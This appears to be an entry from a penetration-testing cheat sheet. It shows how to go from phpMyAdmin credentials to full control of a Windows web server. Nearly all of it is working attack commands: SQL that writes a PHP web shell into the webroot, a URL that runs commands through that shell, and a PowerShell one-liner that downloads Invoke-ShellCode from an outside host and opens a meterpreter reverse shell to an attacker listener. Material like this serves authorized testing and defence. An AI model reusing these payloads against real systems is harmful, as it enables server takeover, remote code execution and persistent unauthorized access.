#### 50. PHPMyAdmin Part 1

###### Exploitation – phpMyAdmin

- Assumptions

    - Username / Password of phpMyAdmin is known
    - Writable directories on the web server are known

- From phpMyAdmin access to SYSTEM privileges

    - Check OS
    
    ```    SHOW VARIABLES LIKE "%version%";
    ```
        - Create webshell
    
    ```	SELECT '<?php echo shell_exec($_GET[\'e\']); ?>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\phpmyadmin\\config\\shell.php'
	```
	
	```
	http://newpc/phpmyadmin/config/shell.php?e=whoami
	```
	
	- Get a meterpreter

	[```Invoke-ShellCode```](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1)

	```
	http://newpc/phpmyadmin/config/shell.php?e=C:\Windows\Syswow64\Windowspowershell\v1.0\powershell.exe -c iex((New-Object Net.WebClient).DownloadString('http://192.168.254.1/Invoke-ShellCode.ps1'));Invoke-ShellCode -Payload windows/meterpreter/reverse_https -LHOST 192.168.254.226 -LPORT 8443 -Force
	```
	
###### Read

- [Putting the MY in phpMyAdmin](https://pen-testing.sans.org/blog/pen-testing/2013/04/10/putting-the-my-in-phpmyadmin)